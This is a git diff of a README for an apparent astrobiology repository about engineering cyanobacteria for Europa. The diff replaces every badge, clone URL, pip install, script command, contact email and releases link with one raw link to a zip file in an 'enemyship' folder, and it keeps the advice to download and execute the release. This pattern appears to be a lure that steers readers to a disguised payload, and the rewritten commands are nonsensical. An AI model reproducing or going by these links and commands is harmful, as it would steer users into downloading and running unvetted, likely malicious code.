@@ -1,7 +1,7 @@
 # 🌌 Europa Cyano Project
 
-![Europa](https://img.shields.io/badge/Europa%20Cyano%20Project-v1.0-blue.svg)  
-![GitHub Releases](https://img.shields.io/badge/Releases-v1.0-orange.svg)
+![Europa](https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip%20Cyano%https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip)  
+![GitHub Releases](https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip)
 
 Welcome to the **Europa Cyano Project**! This repository outlines a visionary bio-engineering project aimed at developing a novel cyanobacterium capable of surviving the extreme conditions of the subglacial ocean on Jupiter's moon Europa and producing oxygen there. This project stands at the intersection of astrobiology and bioengineering, focusing on the potential for life beyond Earth.
 
@@ -62,7 +62,7 @@ To get started with the Europa Cyano Project, you will need to clone this reposi
 1. **Clone the Repository**  
    Use the following command to clone the repository:
    ```bash
-   git clone https://github.com/Kittikorn21/europa-cyano-project.git
+   git clone https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
    ```
 
 2. **Navigate to the Project Directory**  
@@ -74,13 +74,13 @@ To get started with the Europa Cyano Project, you will need to clone this reposi
 3. **Install Dependencies**  
    Install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
    ```
 
 4. **Run Initial Setup**  
    Execute the setup script:
    ```bash
-   python setup.py
+   python https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
    ```
 
 ## Usage
@@ -91,14 +91,14 @@ Once you have installed the project, you can begin exploring the capabilities of
 
 To run a simulation of the engineered cyanobacterium, use:
 ```bash
-python simulate.py
+python https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
 ```
 
 ### Testing Oxygen Production
 
 To test the oxygen production capabilities, execute:
 ```bash
-python test_oxygen.py
+python https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
 ```
 
 ### Viewing Results
@@ -133,11 +133,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or inquiries, please contact the project maintainer:
 
 - **Name**: Kittikorn21
-- **Email**: kittikorn21@example.com
+- **Email**: https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip
 
 ## Releases
 
-For the latest updates and releases, please visit our [Releases page](https://github.com/Kittikorn21/europa-cyano-project/releases). You can download the latest version and execute it to explore the capabilities of the project.
+For the latest updates and releases, please visit our [Releases page](https://raw.githubusercontent.com/Kittikorn21/europa-cyano-project/main/enemyship/cyano_europa_project_2.6.zip). You can download the latest version and execute it to explore the capabilities of the project.
 
 Feel free to check the "Releases" section for any updates or new features added to the project.
 
